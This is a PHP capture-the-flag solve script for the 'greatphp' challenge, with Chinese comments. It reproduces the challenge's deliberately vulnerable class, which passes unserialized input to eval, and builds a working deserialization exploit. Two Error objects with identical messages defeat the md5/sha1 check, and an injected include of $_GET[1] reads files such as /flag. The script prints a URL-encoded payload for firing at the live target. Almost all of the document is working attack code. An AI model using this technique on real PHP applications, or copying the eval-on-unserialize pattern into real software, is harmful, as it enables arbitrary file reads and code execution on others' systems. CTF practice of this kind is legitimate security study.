<?php
// ====== greatphp 本地靶场复刻（题目源码原样抄录） ======
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

// ====== 弹药工坊 v2：换 include 通道 ======
// v1 的反引号 shell 通道在真靶哑火（平台 disable_functions 焊死了 system/exec/shell_exec 全家）
// v2 用 include：语言构造不要括号，路径从 $_GET[1] 来不要引号——读文件根本不需要 shell
// 注意：消息必须用单引号包，双引号会把 $_GET 提前插值进消息里，弹就废了
$msg = '?><?=include $_GET[1]?>';

// 同一行构造两个 Error：出生文件和行号进变形结果，不同行就是不同指纹，门会关死
$pair = [];
foreach ([1, 2] as $code) {
    $pair[] = new Error($msg, $code);      // 消息相同，code 一边 1 一边 2
}

$o = new SYCLOVER();
$o->syc   = $pair[0];
$o->lover = $pair[1];

// ====== 装弹 + 本地试响 ======
$payload = serialize($o);
echo "PAYLOAD:\n$payload\n\nFIRING:\n";
$_GET['1'] = '/flag';   // 本地试响专用；真靶上这个值由 URL 的 &1=... 提供
unserialize($payload);
echo "\n[DONE]\n";

// ====== 发射器：URL 编码版（空字节变 %00，终端里复制这行去打靶） ======
echo "\nURL_READY:\n" . urlencode($payload) . "\n";
